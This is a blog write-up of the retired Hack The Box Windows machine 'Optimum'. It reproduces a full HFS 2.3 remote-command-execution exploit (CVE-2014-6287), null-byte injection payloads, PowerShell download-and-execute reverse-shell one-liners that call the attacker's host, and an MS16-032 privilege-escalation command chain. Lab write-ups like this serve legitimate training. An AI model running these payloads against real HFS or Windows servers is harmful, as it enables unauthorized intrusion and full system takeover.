---
title: "Hack The Box : Optimum (windows)"
date: "2017-11-16T00:35:38.000Z"
lastmod: "2017-11-16T18:53:42.000Z"
tags: ["pentest"]
slug: "hack-the-box-optimum-windows"
url: "/hack-the-box-optimum-windows/"
---
I'm starting a series of write-ups about the [HTB](http://hackthebox.eu) `retired` machines. I have owned 33 machines until now, applying the most diverse techniques, some machines are so well elaborated that they are true masterpieces.

All this information can not be lost and I intend to share with you in detail what I have done to pwn the "best machines".

## Enumeration

A basic port-scan and osscan w/ `nmap` revealed this:

```
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /

Running (JUST GUESSING): Microsoft Windows 2012|7|8|Phone|2008|8.1|Vista (91%)
OS CPE: cpe:/o:microsoft:windows_server_2012 cpe:/o:microsoft:windows_7::-:professional cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1
Aggressive OS guesses: Microsoft Windows Server 2012 (91%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 (90%), Microsoft Windows 7 Professional (87%), Microsoft Windows 8.1 Update 1 (86%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 or Windows 8.1 (85%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%), Microsoft Windows 7 (85%)
```

A `Windows` box running a `HttpFileServer httpd 2.3` on port `80`

## Attack vector

![](/content/images/2017/11/Selection_999-2422-.png)

There is a known `RCE` vulnerability on this service

![](/content/images/2017/11/Selection_999-2423-.png)

```python
#!/usr/bin/python
# Exploit Title: HttpFileServer 2.3.x Remote Command Execution
# Google Dork: intext:"httpfileserver 2.3"
# Date: 04-01-2016
# Remote: Yes
# Exploit Author: Avinash Kumar Thapa aka "-Acid"
# Vendor Homepage: http://rejetto.com/
# Software Link: http://sourceforge.net/projects/hfs/
# Version: 2.3.x
# Tested on: Windows Server 2008 , Windows 8, Windows 7
# CVE : CVE-2014-6287
# Description: You can use HFS (HTTP File Server) to send and receive files.
#           It's different from classic file sharing because it uses web technology to be more compatible with today's Internet.
#           It also differs from classic web servers because it's very easy to use and runs "right out-of-the box". Access your remote files, over the network. It has been successfully tested with Wine under Linux. 

#Usage : python Exploit.py <Target IP address> <Target Port Number>

#EDB Note: You need to be using a web server hosting netcat (http://<attackers_ip>:80/nc.exe).  
#          You may need to run it multiple times for success!

import urllib2  
import sys

try:  
    def script_create():
        urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+save+".}")

    def execute_script():
        urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe+".}")

    def nc_run():
        urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe1+".}")

    ip_addr = "10.10.15.169" #local IP address
    local_port = "3001" # Local Port number
    vbs = "C:\Users\Public\script.vbs|dim%20xHttp%3A%20Set%20xHttp%20%3D%20createobject(%22Microsoft.XMLHTTP%22)%0D%0Adim%20bStrm%3A%20Set%20bStrm%20%3D%20createobject(%22Adodb.Stream%22)%0D%0AxHttp.Open%20%22GET%22%2C%20%22http%3A%2F%2F"+ip_addr+"%2Fnc.exe%22%2C%20False%0D%0AxHttp.Send%0D%0A%0D%0Awith%20bStrm%0D%0A%20%20%20%20.type%20%3D%201%20%27%2F%2Fbinary%0D%0A%20%20%20%20.open%0D%0A%20%20%20%20.write%20xHttp.responseBody%0D%0A%20%20%20%20.savetofile%20%22C%3A%5CUsers%5CPublic%5Cnc.exe%22%2C%202%20%27%2F%2Foverwrite%0D%0Aend%20with"
    save= "save|" + vbs
    vbs2 = "cscript.exe%20C%3A%5CUsers%5CPublic%5Cscript.vbs"
    exe= "exec|"+vbs2
    vbs3 = "C%3A%5CUsers%5CPublic%5Cnc.exe%20-e%20cmd.exe%20"+ip_addr+"%20"+local_port
    exe1= "exec|"+vbs3
    script_create()
    execute_script()
    nc_run()
except:  
    print """[.]Something went wrong..!
    Usage is :[.] python exploit.py <Target IP address>  <Target Port Number>
    Don't forgot to change the Local IP address and Port number on the script"""
```

Analyzing xpl source code, we can see that it uses a [null byte injection](http://projects.webappsec.org/w/page/13246949/Null%20Byte%20Injection) `%00` on parameter `search` to escape the filter of the forbidden characters allowing us to script over [HFS Language](http://www.rejetto.com/wiki/index.php?title=HFS:_scripting_commands) without restriction.

```
http://10.10.10.8/?search=%00{YOUR_HFS_SCRIPT_HERE}
```

With the RCE it runs a VBS script locally that downloads your served `nc.exe` and spawn a reverse shell to you.

Ok, leave the script aside and let's do it all manually.

### Null byte injection

We can confirm the injection on HFS Lang is working by sending a `break` command and analyzing the response..

![](/content/images/2017/11/Selection_999-2431-.png)

**Without null byte**
![](/content/images/2017/11/Selection_999-2429-.png)

**With null byte**
![](/content/images/2017/11/Selection_999-2430-.png)

...using `break` it returns only `1802 bytes` halting the script.

### Remote code execution

This HFS lang allow us to execute commands on server-side using the `exec`

![](/content/images/2017/11/Selection_999-2432-.png)

..to confirm the RCE we can try to send a `ICMP Ping` back to us. You can use `tcpdump` to filter only `ICMP` packets..

![](/content/images/2017/11/Selection_999-2439-.png)

**Attention**

- The system `ENV` variables are working, this is why i'm using full path `C:\Windows\system32\ping.exe`, and this path will vary on Windows versions.
- Sometimes there's a firewall blocking **ICMP packets**. A good idea to contour this is to test reverse connection on TCP port 443 before discard this idea.

### Reverse shell

Now we need a shell on this machine.. It's a windows machine, and we have `Powershell` enabled since `Win2k8+Win7`, so let's google for a good Powershell Reverse shell.

> **Nikhil SamratAshok Mittal** wrote an [awesome article](http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html) about powershell shells and provided a collection of snippets here <https://github.com/samratashok/nishang>

Take his [PowerShellTcp.ps1](https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1) and serve it locally w/ your Python [SimpleHTTPServer](https://docs.python.org/2/library/simplehttpserver.html).

Now we need to find a way to **Download and Execute** this Powershell script.

```
From a 32-bit PowerShell session, to launch a 64-bit PowerShell session, use:
C:\Windows\SysNative\WindowsPowerShell\v1.0\PowerShell.exe

From a 64-bit PowerShell session, to launch a 32-bit PowerShell session, use:
C:\Windows\SysWOW64\WindowsPowerShell\v1.0\PowerShell.exe
```

***Source**: <http://www.madwithpowershell.com/2015/06/64-bit-vs-32-bit-powershell.html>*

To test if Powershell and HTTP reverse connections is working I use this one-liner, it emulates a *nix `WGET`

<script src="https://gist.github.com/intrd/585978b815b89dedd774da1b6b8a1535.js"></script>

Using Win32 paths didn't get any response, but:

```powershell
%00{.exec|+C:\WINDOWS\Sysnative\WindowsPowerShell\v1.0\powershell.exe -NoProfile -ExecutionPolicy unrestricted -Command (new-object System.Net.WebClient).Downloadfile('http://10.10.15.169:3001/test', 'C:\windows\temp\test').}
```

![](/content/images/2017/11/Selection_999-2446-.png)

Awesome, we have a **Winx64** machine w/ Powershell downloading our scripts.

Now launch your local `nc listener` and use this snippet to load the remote `.ps1` in memory and execute.

<script src="https://gist.github.com/intrd/feec7171aa7d172742b330f1f77f3edf.js"></script>

```powershell
%00{.exec|C:\WINDOWS\Sysnative\WindowsPowerShell\v1.0\powershell.exe -NoProfile -ExecutionPolicy unrestricted -Command IEX (New-Object Net.WebClient).DownloadString('http://10.10.15.169:3001/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.15.169 -Port 3002.}
```

Note, I passed my `IP/Port` as args on command-line..

![](/content/images/2017/11/Selection_999-2449-.png)

Finally we got a `kostas` user shell and our `user flag`.

![](/content/images/2017/11/Selection_999-2450-.png)

## Privilege escalation

Now to priv-esc start enumerating all the information you can about the machine..

- System version
- Hot fixes applied
- Users, grops, permissions
- Running processes
- Scheduled tasks
- Routes, firewall state
- Sysprep and Unattended config files..
- Config files (*cfg*, *config*, *ini*)

..any information that might help you in priv-esc.

From `systeminfo` I some interesting machine information

```
Host Name:                 OPTIMUM  
OS Name:                   Microsoft Windows Server 2012 R2 Standard  
OS Version:                6.3.9600 N/A Build 9600  
OS Manufacturer:           Microsoft Corporation  
OS Configuration:          Standalone Server  
...
System Type:               x64-based PC  
...
Windows Directory:         C:\Windows  
System Directory:          C:\Windows\system32  
...
Domain:                    HTB  
Logon Server:              \\OPTIMUM  
Hotfix(s):                 31 Hotfix(s) Installed.  
                           [01]: KB2959936
                           [02]: KB2896496
                           [03]: KB2919355
                           [04]: KB2920189
                           [05]: KB2928120
                           [06]: KB2931358
                           [07]: KB2931366
                           [08]: KB2933826
                           [09]: KB2938772
                           [10]: KB2949621
                           [11]: KB2954879
                           [12]: KB2958262
                           [13]: KB2958263
                           [14]: KB2961072
                           [15]: KB2965500
                           [16]: KB2966407
                           [17]: KB2967917
                           [18]: KB2971203
                           [19]: KB2971850
                           [20]: KB2973351
                           [21]: KB2973448
                           [22]: KB2975061
                           [23]: KB2976627
                           [24]: KB2977629
                           [25]: KB2981580
                           [26]: KB2987107
                           [27]: KB2989647
                           [28]: KB2998527
                           [29]: KB3000850
                           [30]: KB3003057
                           [31]: KB3014442
```

This is a `Windows Server 2012 R2` box w/ some hot fixes applied, using `wmic` you can list detailed information of each one:

```
wmic qfe get Caption,Description,HotFixID,InstalledOn

Caption                                     Description      HotFixID   InstalledOn  
                                            Update           KB2959936  11/22/2014   
http://support.microsoft.com/?kbid=2896496  Update           KB2896496  11/22/2014  
http://support.microsoft.com/?kbid=2919355  Update           KB2919355  11/22/2014  
http://support.microsoft.com/?kbid=2920189  Security Update  KB2920189  11/22/2014  

...
```

Combinating w/ [exploit.db](https://www.exploit-db.com) you can try to figure out witch one is not applied to a known vulnerability that allows priv-esc.

But it's painful. Why not use an automated tool to do this work?

### Windows exploit suggester

This is a Python script that uses your `systeminfo` dump to check missing hot fixes and list the possible vulnerabilities.

- Download here [Windows-Exploit-Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester)
- Update w/ `python windows-exploit-suggester.py --update`
- Feed it w/ your systeminfo dump `python windows-exploit-suggester.py --database 2017-11-15-mssb.xls --systeminfo ../systeminfo.txt`

```
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (ascii)
[*] querying database file for potential vulnerabilities
[*] comparing the 32 hotfix(es) against the 266 potential bulletins(s) with a database of 137 known exploits
[*] there are now 246 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2012 R2 64-bit'
...
[E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important
[*]   https://www.exploit-db.com/exploits/40107/ -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF
[*]   https://www.exploit-db.com/exploits/39574/ -- Microsoft Windows 8.1/10 - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032), PoC
[*]   https://www.exploit-db.com/exploits/39719/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (PowerShell), PoC
[*]   https://www.exploit-db.com/exploits/39809/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (C#)
```

So, it listed a several possible exploits for priv-esc, but the `MS16-032` caught my attention because it is exactly for `Windows 2012 R2 64-bit`, has a well known `Powershell PoC` also a Metasploit-framework module.

You can see this exploit in action here..

<iframe allowfullscreen="" frameborder="0" gesture="media" height="315" src="https://www.youtube.com/embed/cZzkTZklba8" width="560"></iframe>

It is designed to execute locally and spawns a new `cmd.exe` w/ `NT Authority\SYSTEM` privilege. We do not have visual access to this machine and we will not be able to access this new `cmd.exe`.

Ok, we can enable a Remote Desktop or VLC connection to do this, but it sucks!

> The solution I found was to modify the script to accept commands in the arguments and execute anything as `NT Authority\SYSTEM` instead of that new `cmd.exe`.

```
Invoke-MS16-032 "-NoProfile -ExecutionPolicy Bypass -Command YOUR_COMMAND_HERE"
```

![](/content/images/2017/11/Selection_999-2458-.png)

Download `ms16_032_intrd_mod.ps1` here: <https://gist.github.com/intrd/6dda33f61dca560e6996d01c62203374>

Using our user shell we can invoke the `MS16-032` exploit and pass our reverse-shell one-liner as argument to get our `NT Authority\SYSTEM` spawned on another `nc` listener/port..

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://10.10.15.169:3001/ms16_032_intrd_mod.ps1');Invoke-MS16-032 "-NoProfile -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://10.10.15.169:3001/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.15.169 -Port 3003"
```

![](/content/images/2017/11/Selection_999-2451-.png)

## Final note

I saw a lot of people suffering to get `NT Authority\SYSTEM` on this box @ [hackthebox.eu](https://www.hackthebox.eu/), and the main reason is because it is dependent on having `thread handle` available on machine.

The people downloaded the exploit without understanding/modifying, run and keep spawning the local system-shell they did not have access N times until the thread handles were running out and the exploit did not work anymore.

The obvious recommendation in this case is to test your exploit locally in an environment you control. When it works reset the remote machine and run your exploit.

## References

- Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2) - <https://www.exploit-db.com/exploits/39161/>
- HFS: scripting commands -
  <http://www.rejetto.com/wiki/index.php?title=HFS>:*scripting*commands
- Null Byte Injection - <http://projects.webappsec.org/w/page/13246949/Null%20Byte%20Injection>
- Powershell System Paths - <http://www.madwithpowershell.com/2015/06/64-bit-vs-32-bit-powershell.html>
- Week of PowerShell Shells Day 1 - <http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html>
- Samratashok Powershell reverse shells -
  <https://github.com/samratashok/nishang/tree/master/Shells>
- Windows exploit suggester - <https://github.com/GDSSecurity/Windows-Exploit-Suggester>
- Security Update for Secondary Logon to Address Elevation of Privilege (3143141) -
  <https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2016/ms16-032>
- Exploiting a Leaked Thread Handle -
  <https://googleprojectzero.blogspot.com.br/2016/03/exploiting-leaked-thread-handle.html>
- Win7-Win10 & 2k8-2k12 <== 32/64bit privilege escalation (MS16-032 exploit modded) - command argv + reverse shell - <https://gist.github.com/intrd/6dda33f61dca560e6996d01c62203374>
- Invoke-PowerShellTcp.ps1 - <https://gist.github.com/intrd/d5086206bdef0ba1d7776c5325547626>
- powershell_wget_oneliner.ps1 - <https://gist.github.com/intrd/585978b815b89dedd774da1b6b8a1535>
- powershell_download_exec.ps1 -<https://gist.github.com/intrd/feec7171aa7d172742b330f1f77f3edf>
